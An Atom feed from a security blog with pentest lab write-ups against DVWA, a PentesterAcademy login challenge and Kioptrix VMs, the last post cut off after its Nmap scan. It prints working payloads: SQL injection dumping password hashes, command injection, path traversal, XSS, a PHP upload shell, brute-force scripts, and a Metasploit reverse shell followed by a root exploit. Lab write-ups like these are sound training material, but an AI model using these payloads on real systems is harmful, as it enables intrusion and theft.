<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-08-15T22:51:46+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Damn Vulnerable Web Application]]></title>
    <link href="http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application/"/>
    <updated>2014-08-08T00:30:24+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/08/08/pentest-lab-damn-vulnerable-web-application</id>
    <content type="html"><![CDATA[<p>It&rsquo;s time for some web hacking in my pentest lab, so in this post I will go over attacking DVWA.</p>

<!-- more -->


<blockquote><p>Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn
vulnerable. Its main goals are to be an aid for security professionals to test their
skills and tools in a legal environment, help web developers better understand the
processes of securing web applications and aid teachers/students to teach/learn web
application security in a class room environment.</p></blockquote>

<p>Since it&rsquo;s already installed on Metasploitable, I didn&rsquo;t have to install it. The default credentials for logging in are <em>admin: password</em>.</p>

<p>For this lab I will use the low and medium levels of security and PHPIDS disabled. The high security setting represents the secure implementation that aims to eliminate the vulnerabilities.</p>

<h3>Brute Force</h3>

<p><a href="https://www.owasp.org/index.php/Brute_force_attack"><strong>Overview</strong></a></p>

<blockquote><p>A brute force attack can manifest itself in many different ways, but primarily consists in an attacker configuring predetermined
values, making requests to a server using those values, and then analyzing the response. For the sake of efficiency, an attacker may
use a dictionary attack (with or without mutations) or a traditional brute-force attack (with given classes of characters e.g.:
alphanumerical, special, case (in)sensitive). Considering a given method, number of tries, efficiency of the system which conducts the
attack, and estimated efficiency of the system which is attacked the attacker is able to calculate approximately how long it will take
to submit all chosen predetermined values.</p></blockquote>

<p><img class="center" src="/images/dvwa/bruteforce.png" title="&lsquo;bruteforce&rsquo; &lsquo;bruteforce&rsquo;" ></p>

<p>In the first challenge we have to brute force a login form.</p>

<p>As always, first I used some dummy values to see how is the data transmitted, and it&rsquo;s visible in the URL:</p>

<p><code>plain
http://metasploitable/dvwa/vulnerabilities/brute/?username=test&amp;password=test&amp;Login=Login#
</code></p>

<p>I will use Hydra to brute force the form. I created some files with usernames and passwords:</p>

<p>``` plain
cat users.txt
admin
test
administrator</p>

<p>cat pass.txt
admin
1234
password
letmein
test
password1234
```</p>

<p>I ran Hydra like this:</p>

<p>``` plain
hydra 192.168.127.128 -L ~/Desktop/users.txt -P ~/Desktop/pass.txt http-get-form &ldquo;/dvwa/vulnerabilities/brute/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=798cbe3ff31159e5a08aae5a407f81cf&rdquo;</p>

<p>Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak &ndash; for legal purposes only</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-08-09 13:05:32
[DATA] 16 tasks, 1 server, 18 login tries (l:3/p:6), ~1 try per task
[DATA] attacking service http-get-form on port 80
[80][www-form] host: 192.168.127.128   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-08-09 13:05:33
```</p>

<p>And we have cracked it!</p>

<h3>Command Execution</h3>

<p><a href="https://www.owasp.org/index.php/Command_Injection"><strong>Overview</strong></a></p>

<blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable
application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers
etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of
the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p></blockquote>

<p><img class="center" src="/images/dvwa/rce.png" title="&lsquo;code execution&rsquo; &lsquo;remote code execution&rsquo;" ></p>

<p>On this page we can ping an arbitrary IP address. We can run arbitrary code by typing <code>;whoami</code>, which will tell us the server is running as the <em>www-data</em> user. The semicolon is a way to stack commands in Linux, so here we use it to end the previous command (which was the ping functionality), and we insert a new command of our choosing to be run by the vulnerable server.</p>

<p>On medium, the same results can be achieved by entering <code>||whoami</code> instead.</p>

<p>The difference between the operators is that <code>;</code> runs both commands irrespective of the first command&rsquo;s status, whereas <code>||</code> executes the second command only if the previous one failed.</p>

<h3>CSRF</h3>

<p><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29"><strong>Overview</strong></a></p>

<blockquote><p>CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated.
With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application
into executing actions of the attacker&rsquo;s choosing. A successful CSRF exploit can compromise end user data and operation in case of
normal user. If the targeted end user is the administrator account, this can compromise the entire web application.</p></blockquote>

<p><img class="center" src="/images/dvwa/csrf.png" title="&lsquo;csrf&rsquo; &lsquo;csrf&rsquo;" ></p>

<p>We see here that we can change the admin password. When we submit the new password, we see the request looks like this:</p>

<p><code>plain
http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#
</code></p>

<p>We can exploit this behavior to change anyone&rsquo;s password as long as they are logged in to the application, by tricking the user to perform the request. The exact method may differ, but an example would be to use the image tag to make the request behind the scenes. Of course, this could be achieved by manipulating HTML in other ways too, with a link, iframe, script, etc.</p>

<p><code>plain
&lt;img src="http://metasploitable/dvwa/vulnerabilities/csrf/?password_new=newpass&amp;password_conf=newpass&amp;Change=Change#"&gt;
</code></p>

<h3>File Inclusion</h3>

<p><a href="https://www.owasp.org/index.php/OWASP_Periodic_Table_of_Vulnerabilities_-_Remote_File_Inclusion"><strong>Overview</strong></a></p>

<blockquote><p>The application loads data from an attacker-controlled resource at runtime, enabling a variety of malicious activities. Either the
source address or the resource itself (or both) may be under the attacker&rsquo;s control.</p></blockquote>

<p><img class="center" src="/images/dvwa/include.png" title="&lsquo;file inclusion&rsquo; &lsquo;include file&rsquo;" ></p>

<p>The file inclusion is pretty straightforward:</p>

<p><code>plain
http://192.168.127.128/dvwa/vulnerabilities/fi/?page=../../../../../../../../../etc/passwd
</code></p>

<h3>SQL Injection</h3>

<p><a href="https://www.owasp.org/index.php/SQL_Injection"><strong>Overview</strong></a></p>

<blockquote><p>A SQL injection attack consists of insertion or &ldquo;injection&rdquo; of a SQL query via the input data from the client to the application. A
successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute
administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file
system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL
commands are injected into data-plane input in order to effect the execution of predefined SQL commands.</p></blockquote>

<p><img class="center" src="/images/dvwa/sqli.png" title="&lsquo;sqli&rsquo; &lsquo;sqli&rsquo;" ></p>

<p>The vulnerability is straightforward. On low security, injecting <code>&lsquo;or 1=1&mdash; </code> returns all records:</p>

<p>``` plain
ID: &lsquo;or 1=1&mdash;
First name: admin
Surname: admin</p>

<p>ID: &lsquo;or 1=1&mdash;
First name: Gordon
Surname: Brown</p>

<p>ID: &lsquo;or 1=1&mdash;
First name: Hack
Surname: Me</p>

<p>ID: &lsquo;or 1=1&mdash;
First name: Pablo
Surname: Picasso</p>

<p>ID: &lsquo;or 1=1&mdash;
First name: Bob
Surname: Smith
```
The <em>id</em> parameter is vulnerable, as expected. From here we can proceed in different ways, fingerprinting the host, retrieving more information, etc. I will settle for getting the password hashes for the users we have discovered.</p>

<p><strong>Discover the number of colums</strong></p>

<p><code>&lsquo;union select 1,2&mdash; </code></p>

<p><code>plain
ID: 'union select 1,2--
First name: 1
Surname: 2
</code></p>

<p><strong>Get database name</strong></p>

<p><code>&lsquo;union select database(),2&mdash; </code></p>

<p><code>plain
ID: 'union select database(),2--
First name: dvwa
Surname: 2
</code></p>

<p><strong>Get table names for the current database</strong></p>

<p><code>&lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash; </code></p>

<p>``` plain
ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
First name: guestbook
Surname: 2</p>

<p>ID: &lsquo;union select table_name,2 from information_schema.tables where table_schema=database()&mdash;
First name: users
Surname: 2
```</p>

<p><strong>Get column names for the users table</strong></p>

<p><code>&lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;  </code></p>

<p>``` plain
ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: user_id
Surname: 2</p>

<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: first_name
Surname: 2</p>

<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: last_name
Surname: 2</p>

<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: user
Surname: 2</p>

<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: password
Surname: 2</p>

<p>ID: &lsquo;union select column_name, 2 from information_schema.columns where table_name='users&rsquo;&mdash;<br/>
First name: avatar
Surname: 2
```</p>

<p><strong>Get password hashes</strong></p>

<p><code>&lsquo;union select user, password from users&mdash; </code></p>

<p>``` plain
ID: &lsquo; union select user, password from users&mdash;
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99</p>

<p>ID: &lsquo; union select user, password from users&mdash;
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03</p>

<p>ID: &lsquo; union select user, password from users&mdash;
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</p>

<p>ID: &lsquo; union select user, password from users&mdash;
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</p>

<p>ID: &lsquo; union select user, password from users&mdash;
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```</p>

<p>On medium security, the injection query only differs in using an integer instead of a quote: <code>99 or 1=1&mdash; </code>.</p>

<h3>SQL Injection (Blind)</h3>

<p><a href="https://www.owasp.org/index.php/Blind_SQL_Injection"><strong>Overview</strong></a></p>

<blockquote><p>Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and
determines the answer based on the applications response. This attack is often used when the web application is configured to show
generic error messages, but has not mitigated the code that is vulnerable to SQL injection.</p>

<p>When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the
SQL Query&rsquo;s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the
data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by
asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not
impossible.</p></blockquote>

<p>Since this is more or less identical to the previous SQL injection, I will instead use sqlmap against it, so I don&rsquo;t have to repeat the same queries:</p>

<p><code>plain
sqlmap -u "http://192.168.127.128/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=cd855d2bfb73dfe22ef2f11a475fa9e6" --dbms=MySQL --dump
</code></p>

<h3>Upload</h3>

<p><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload"><strong>Overview</strong></a></p>

<blockquote><p>Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be
attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the
first step.</p>

<p>The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database,
forwarding attacks to back-end systems, and simple defacement. It depends on what the application does with the uploaded file and
especially where it is stored.</p></blockquote>

<p><img class="center" src="/images/dvwa/upload.png" title="&lsquo;file upload&rsquo; &lsquo;upload&rsquo;" ></p>

<p>I am going to upload a PHP file that runs the command <em>uname -a</em>:</p>

<p>``` php
&lt;?php</p>

<p>$cmd = system(&lsquo;uname -a&rsquo;);
echo $cmd;</p>

<p>?>
```</p>

<p>After uploading the file, the path where we can find it is conveniently provided:</p>

<p><em>../../hackable/uploads/upload.php succesfully uploaded!</em></p>

<p>Navigate to the file to see the command output:</p>

<p><code>plain
192.168.127.128/dvwa/vulnerabilities/upload/../../hackable/uploads/upload.php
</code></p>

<p>On medium security, the code checks if the file is a jpeg image and under a certain size:</p>

<p><code>php
if (($uploaded_type == "image/jpeg") &amp;&amp; ($uploaded_size &lt; 100000))
</code></p>

<p>However, this can be easily bypassed by intercepting the request and modifying the filename. Here is what I had in Live HTTP Headers:</p>

<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php%00.jpg&rdquo;</code></p>

<p>And I modified it to:</p>

<p><code>Content-Disposition: form-data; name=&ldquo;uploaded&rdquo;; filename=&ldquo;upload.php&rdquo;\r\n</code></p>

<h3>XSS reflected</h3>

<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Reflected_XSS_Attacks"><strong>Overview</strong></a></p>

<blockquote><p>Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or
any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to
victims via another route, such as in an e-mail message, or on some other web site. When a user is tricked into clicking on a malicious
link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web
site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a &ldquo;trusted&rdquo; server.
Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.</p></blockquote>

<p><img class="center" src="/images/dvwa/xss_reflected.png" title="&lsquo;reflected xss&rsquo; &lsquo;reflected xss&rsquo;" ></p>

<p>Low security:</p>

<p>``` html</p>

<script>alert(document.cookie)</script>


<p>```</p>

<p>Medium security:</p>

<p>``` html</p>

<SCRIPT>alert(document.cookie)</SCRIPT>


<p>```</p>

<h3>XSS stored</h3>

<p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_XSS_Attacks"><strong>Overview</strong></a></p>

<blockquote><p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message
forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored
information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p></blockquote>

<p><img class="center" src="/images/dvwa/xss_stored.png" title="&lsquo;stored xss&rsquo; &lsquo;stored xss&rsquo;" ></p>

<p>The vulnerable field is the name box. The XSS strings that I used on the reflected XSS page work for this one as well, the only difference is that I had to use Firebug to modify the maximum length from 10 to an arbitrary higher value.</p>

<p>As you can see, DVWA was..damn vulnerable!</p>

<blockquote><p>Cheer Up!  Things are getting worse at a slower rate.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
    <updated>2014-07-27T00:31:26+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>

<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>

<!-- more -->


<p>This is how the page looks like:</p>

<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>

<p>The provided hint should help with writing a bruteforce script:</p>

<p><strong>Hint:</strong></p>

<p><strong>Company Domain: PentesterAcademy.com</strong></p>

<p><strong>Usernames: jack, admin</strong></p>

<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>

<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>

<p>I wrote a Python script to do that:</p>

<p>``` python
import requests
import itertools</p>

<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>

<p>emails = [&lsquo;<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#106;&#x61;&#99;&#107;&#64;&#x70;&#101;&#110;&#x74;&#x65;&#115;&#116;&#101;&#114;&#x61;&#x63;&#97;&#x64;&#101;&#109;&#x79;&#x2e;&#99;&#x6f;&#x6d;">&#106;&#x61;&#x63;&#107;&#x40;&#112;&#101;&#x6e;&#116;&#x65;&#x73;&#x74;&#x65;&#x72;&#97;&#99;&#x61;&#x64;&#x65;&#109;&#121;&#46;&#99;&#x6f;&#x6d;</a>&rsquo;, \</p>

<pre><code>      'admin@pentesteracademy.com']
</code></pre>

<p>def buildPassList(iterables, r):</p>

<pre><code>passlist = []
for word in itertools.product(iterables, repeat = r):
    passlist.append(''.join(word))
return passlist
</code></pre>

<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>

<p>count = 0
fail = &lsquo;Failed! Please try again!&rsquo;
for user in emails:</p>

<pre><code>for passwd in passlist:
    print 'Try %d - email: %s password: %s' % (count, user, passwd)
    payload = {'email': user, 'password': passwd}
    req = requests.get(url, params=payload)
    if fail not in req.content:
        print payload
        print req.content
        break          
    count += 1
</code></pre>

<p>```</p>

<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>

<p><code>plain
http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
</code></p>

<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>

<p>Here is a snippet of the output:</p>

<p><code>plain
Try 0 - email: jack@pentesteracademy.com password: xxxxx
Try 1 - email: jack@pentesteracademy.com password: xxxxy
...
Try 477 - email: admin@pentesteracademy.com password: zzzxx
Try 478 - email: admin@pentesteracademy.com password: zzzxy
{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
</code></p>

<p>Today&rsquo;s fortune cookie:</p>

<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
are making another attack.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix 2014]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/27/kioptrix-2014/"/>
    <updated>2014-06-27T19:01:09+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/27/kioptrix-2014</id>
    <content type="html"><![CDATA[<p>Right when I thought I was finished with the Kioptrix vulnerable machines, I discovered there is a new addition to the series! This is great, because I really enjoyed the Kioptrix challenges! So let&rsquo;s dive in!</p>

<!-- more -->


<p>First, if you have problems with booting it up, check out the fix and instructions from <a href="http://vulnhub.com/entry/kioptrix_2014-5,62/">http://vulnhub.com/entry/kioptrix_2014-5,62/</a></p>

<p>Let&rsquo;s fire Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.130</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-27 19:14 EEST
Nmap scan report for 192.168.127.130
Host is up (0.0031s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
| http-methods: Potentially risky methods: TRACE
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: Site doesn&rsquo;t have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 403)
|</em>http-title: 403 Forbidden
MAC Address: 00:0C:29:BB:7C:98 (VMware)
Device type: general purpose
Running: FreeBSD 7.X|8.X|9.X
OS CPE: cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:9
OS details: FreeBSD 7.0-RELEASE &ndash; 9.0-RELEASE
```</p>

<p>Next I used the browser to check what is being hosted on ports 80 and 8080. On port 80 there is just an &ldquo;It works!&rdquo; message, and on port 8080 I got the Forbidden message. But on port 80&rsquo;s page source code, there is a comment revealing additional functionality:</p>

<p><code>html
&lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php"&gt;
</code></p>

<p><img class="center" src="/images/pchart.png" title="&lsquo;pchart&rsquo; &lsquo;pchart&rsquo;" ></p>

<p>Searching for pChart reveals that this version is affected by <a href="http://www.exploit-db.com/exploits/31173/">directory traversal and XSS</a></p>

<p>So we can read any file that the web server is sufficiently privileged to read with the following string:</p>

<p><code>plain
http://192.168.127.130/pChart2.1.3/examples/index.php?Action=View&amp;Script=/../../etc/passwd
</code></p>

<p>In this case, there wasn&rsquo;t much information that could be of further use, and I wasn&rsquo;t able to read /etc/shadow, which was to be expected. Fortunately, the Apache configuration file is helpful. Since this is a FreeBSD system, the file is located in <code>/usr/local/etc/apache2x/httpd.conf</code> , <em>x</em> being the version number. At the moment, the only thing I could find interesting was this part at the very end of the file:</p>

<p>``` plain
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser</p>

<p><VirtualHost *:8080></p>

<pre><code>DocumentRoot /usr/local/www/apache22/data2
</code></pre>

<p><Directory "/usr/local/www/apache22/data2"></p>

<pre><code>Options Indexes FollowSymLinks
AllowOverride All
Order allow,deny
Allow from env=Mozilla4_browser
</code></pre>

<p></Directory>
```</p>

<p>So it appears that a certain user agent receives special treatment! Let&rsquo;s verify this by changing the UA (I used the User Agent Switcher add-on for Firefox). And when I went to <a href="http://192.168.127.130:8080/">http://192.168.127.130:8080/</a> , there was a directory index for something called phptax! No more forbidden errors!</p>

<p><img class="center" src="/images/phptax.png" title="&lsquo;phptax&rsquo; &lsquo;phptax&rsquo;" ></p>

<p>So, <a href="http://sourceforge.net/projects/phptax/">the program</a> is used to generate PDFs. The good news (for us, not for the dilligent tax payers) is that it&rsquo;s <a href="http://www.exploit-db.com/exploits/21665/">vulnerable to remote code execution</a>, and there&rsquo;s also a Metasploit module available for it:</p>

<p><strong>PhpTax pfilez Parameter Exec Remote Code Injection</strong></p>

<blockquote><p>This module exploits a vulnerability found in PhpTax, an income tax report
generator. When generating a PDF, the icondrawpng() function in drawimage.php does
not properly handle the pfilez parameter, which will be used in a exec() statement,
and then results in arbitrary remote code execution
under the context of the web  server. Please note: authentication is not required to exploit this vulnerability.</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/phptax_exec
msf exploit(phptax_exec) > show options</p>

<p>Module options (exploit/multi/http/phptax_exec):</p>

<p>   Name       Current Setting  Required  Description</p>

<hr />

<p>   Proxies                     no        Use a proxy chain
   RHOST                       yes       The target address
   RPORT      80               yes       The target port
   TARGETURI  /phptax/         yes       The path to the web application
   VHOST                       no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   PhpTax 0.8</p>

<p>msf exploit(phptax_exec) > set RHOST 192.168.127.130
RHOST => 192.168.127.130
msf exploit(phptax_exec) > set RPORT 8080
RPORT => 8080
msf exploit(phptax_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(phptax_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(phptax_exec) > exploit</p>

<p>[<em>] Started reverse double handler
[</em>] 192.168.127.1308080 &ndash; Sending request&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo ROZVUxzhMsI70Nsb;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket B
[</em>] B: &ldquo;ROZVUxzhMsI70Nsb\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] A is input&hellip;
[<em>] Accepted the first client connection&hellip;
[</em>] Accepted the second client connection&hellip;
[<em>] Command: echo D6E80V1rZ169oQA6;
[</em>] Writing to socket A
[<em>] Writing to socket B
[</em>] Reading from sockets&hellip;
[<em>] Reading from socket A
[</em>] A: &ldquo;D6E80V1rZ169oQA6\r\n&rdquo;
[<em>] Matching&hellip;
[</em>] B is input&hellip;</p>

<p>whoami
www
```</p>

<p>We managed to break through. Now let&rsquo;s see how we can become root. I used <a href="http://www.exploit-db.com/exploits/26368/">this mmap/ptrace exploit</a></p>

<p>I downloaded it to my machine and served it on netcat, than I connected from the victim to the attacker machine and saved the file to the /tmp directory. From there, it was a matter of compiling it and running it:</p>

<p><code>plain
gcc -o exploit 26368.c
chmod a+x exploit
./exploit
whoami
root
</code></p>

<p>In the /root directory, there&rsquo;s another congrats.txt from loneferret:</p>

<p>``` plain
cat congrats.txt
If you are reading this, it means you got root (or cheated).
Congratulations either way&hellip;</p>

<p>Hope you enjoyed this new VM of mine. As always, they are made for the beginner in
mind, and not meant for the seasoned pentester. However this does not mean one
can&rsquo;t enjoy them.</p>

<p>As with all my VMs, besides getting &ldquo;root&rdquo; on the system, the goal is to also
learn the basics skills needed to compromise a system. Most importantly, in my mind,
are information gathering &amp; research. Anyone can throw massive amounts of exploits
and &ldquo;hope&rdquo; it works, but think about the traffic.. the logs&hellip; Best to take it
slow, and read up on the information you gathered and hopefully craft better
more targetted attacks.</p>

<p>For example, this system is FreeBSD 9. Hopefully you noticed this rather quickly.
Knowing the OS gives you any idea of what will work and what won&rsquo;t from the get go.
Default file locations are not the same on FreeBSD versus a Linux based distribution.
Apache logs aren&rsquo;t in &ldquo;/var/log/apache/access.log&rdquo;, but in &ldquo;/var/log/httpd-access.log&rdquo;.
It&rsquo;s default document root is not &ldquo;/var/www/&rdquo; but in &ldquo;/usr/local/www/apache22/data&rdquo;.
Finding and knowing these little details will greatly help during an attack. Of course
my examples are specific for this target, but the theory applies to all systems.</p>

<p>As a small exercise, look at the logs and see how much noise you generated. Of course
the log results may not be accurate if you created a snapshot and reverted, but at least
it will give you an idea. For fun, I installed &ldquo;OSSEC-HIDS&rdquo; and monitored a few things.
Default settings, nothing fancy but it should&rsquo;ve logged a few of your attacks. Look
at the following files:
/root/folderMonitor.log
/root/httpd-access.log (softlink)
/root/ossec-alerts.log (softlink)</p>

<p>The folderMonitor.log file is just a cheap script of mine to track created/deleted and modified
files in 2 specific folders. Since FreeBSD doesn&rsquo;t support &ldquo;iNotify&rdquo;, I couldn&rsquo;t use OSSEC-HIDS
for this.
The httpd-access.log is rather self-explanatory .
Lastly, the ossec-alerts.log file is OSSEC-HIDS is where it puts alerts when monitoring certain
files. This one should&rsquo;ve detected a few of your web attacks.</p>

<p>Feel free to explore the system and other log files to see how noisy, or silent, you were.
And again, thank you for taking the time to download and play.
Sincerely hope you enjoyed yourself.</p>

<p>Be good&hellip;</p>

<p>loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>p.s.: Keep in mind, for each &ldquo;web attack&rdquo; detected by OSSEC-HIDS, by
default it would&rsquo;ve blocked your IP (both in hosts.allow &amp; Firewall) for
600 seconds. I was nice enough to remove that part :)
```</p>

<p>This concludes the Kioptrix series, and cheers to <strong>loneferret</strong> for creating these awesome challenges!</p>

<blockquote><p>Today is the first day of the rest of the mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
    <updated>2014-06-22T22:39:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>

<!-- more -->


<p>Let&rsquo;s see what Nmap reveals:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.129</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-22 22:35 EEST
Nmap scan report for 192.168.127.129
Host is up (0.00074s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|<em>  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&rsquo;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:1F:12:65 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
